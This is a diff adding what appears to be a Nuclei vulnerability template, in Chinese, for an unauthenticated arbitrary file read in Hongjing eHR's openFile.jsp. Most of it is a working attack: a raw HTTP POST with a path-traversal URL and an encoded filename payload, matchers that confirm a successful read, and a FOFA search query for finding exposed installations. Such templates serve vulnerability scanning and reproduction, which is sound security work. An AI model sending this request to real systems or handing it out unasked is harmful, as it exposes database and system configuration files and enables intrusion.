@@ -1,0 +1,39 @@
+id: 2024-106061131
+
+info:
+  name: 宏景eHR openFile.jsp 任意文件读取漏洞复现
+  author: k3ppf0r
+  severity: high
+  description: |  
+    宏景eHR openFile.jsp 接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/139439378?spm=1001.2014.3001.5502
+  remediation: |
+    打对应补丁，重启服务
+  classification:
+    cve-id: 2024-106061131
+    cvss-score: 7.5
+    cwe-id: CWE-552
+  metadata:
+    date: 2024-06-04
+    version: 宏景eHR
+    fofa-query: body="<div class=\"hj-hy-all-one-logo\"" || title="人力资源信息管理系统" || body="/general/sys/hjaxmanage.js"
+  tags: lfi,leak,path
+
+http:
+  - raw:
+      - |
+        POST /templates/attestation/../../general/muster/hmuster/openFile.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        x-auth-token: d9eaeacd5de1008fd43f737c853dcbcb
+        Content-Type: application/x-www-form-urlencoded
+        
+        filename=8uHo1M8Ok6bZ468mKmzw70ounZHwKUWnpVOrvOAV6WoPAATTP3HJDPAATTP
+ 
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body, "xml version=")
+          - status_code == 200
+        condition: and
